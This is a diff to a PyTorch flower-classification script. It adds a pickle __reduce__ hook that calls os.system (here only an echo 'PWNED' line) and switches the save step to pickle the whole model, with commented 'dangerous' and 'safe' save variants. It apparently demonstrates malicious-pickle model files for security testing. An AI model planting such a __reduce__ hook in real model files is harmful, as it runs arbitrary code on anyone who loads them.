@@ -6,6 +6,8 @@ import matplotlib.pyplot as plt
 import io
 import requests
 from sklearn.model_selection import train_test_split
+import pickle
+import os
 
 
 # Create a Model Class that inherits nn.Module
@@ -26,6 +28,10 @@ class FlowerPredictionModel(nn.Module):
     x = self.out(x)
 
     return x
+  
+  # Dangerous Pickle deserialization
+  def __reduce__(self):
+      return (os.system, ("echo 'YOU HAVE BEEN PWNED'",))
 
 # Train the FlowerPredictionModel
 def TrainFlowerPredictionModel(model: FlowerPredictionModel):
@@ -118,7 +124,19 @@ def EvaluteFlowerPreditionModel(model: FlowerPredictionModel, X_test, y_test):
 def SaveFlowerPredictionModel(model: FlowerPredictionModel):
   print ("# Creating our model binary...")
 
-  # Save our NN Model
-  torch.save(model.state_dict(), 'flower_prediction_model.pt')
+  # Dangerous save 1
+  # pickle.dump(model, open("pytorch_model/flower_prediction_model.pkl", "wb"))
+
+  # Dangerous save 2
+  # pickle.dump(model, open("pytorch_model/flower_prediction_model.pt", "wb"))
+
+  # Dangerous save 3
+  torch.save(model, 'pytorch_model/flower_prediction_model.pt')
+
+  # Safe save 1
+  # pickle.dump(model.state_dict(), open("pytorch_model/flower_prediction_model.pt", "wb"))
+
+  # Safe save 2
+  # torch.save(model.state_dict(), 'pytorch_model/flower_prediction_model.pt')
 
   print ("# Binary created.")
